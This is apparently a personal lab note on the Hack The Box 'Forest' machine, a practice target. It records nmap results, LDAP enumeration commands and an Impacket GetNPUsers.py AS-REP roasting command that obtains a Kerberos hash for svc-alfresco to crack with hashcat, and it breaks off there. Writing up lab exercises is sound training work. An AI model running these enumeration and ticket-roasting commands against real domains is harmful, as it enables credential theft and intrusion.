let's start with exporting the ip so we can use it faster 
export IP=10.129.95.210
then let's run our nmap scan 
# nmap 
53/tcp   open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-10-08 14:15:42Z)
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?    syn-ack ttl 127
593/tcp  open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped   syn-ack ttl 127
3268/tcp open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped   syn-ack ttl 127
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

from the ports open we can say that it's active directory server running with kerberos

Domain name : htb.local

# smb enum
let's try to login as anonymous to the server [[SMB]]
we are in but it doesn't show any shares #smb

# DNS enum
nslookup
server 
10.129.95.210
127.0.0.1
10.129.95.210
and nothing
# ldap enum
ldapsearch -h 10.129.95.210 -x -s base namingcontexts
![[Pasted image 20211008164648.png]]
ldapsearch -h 10.129.95.210 -x -b "DC=htb,DC=local" > ldap.out to dump info from ldap server then we can try to query using 
ldapsearch -h 10.129.95.210 -x -b "DC=htb,DC=local" '(object Class=Person)'
ldapsearch -h 10.129.95.210 -x -b "DC=htb,DC=local" '(object Class=Person)' sAMAccountName 


# impakets
[[Impakets]]
trying to do GetNPUsers.py impaket 
GetNPUsers.py -dc-ip $IP -request 'htb.local/' -format hashcat
and we got a ticket!
![[Pasted image 20211008172555.png]]
for the username svc-alfresco
[[00 Progress/Boxes/HTB/Windows/Forest/04 Creds]]

# using hashcat to crack the hash
![[Pasted image 20211008173112.png]]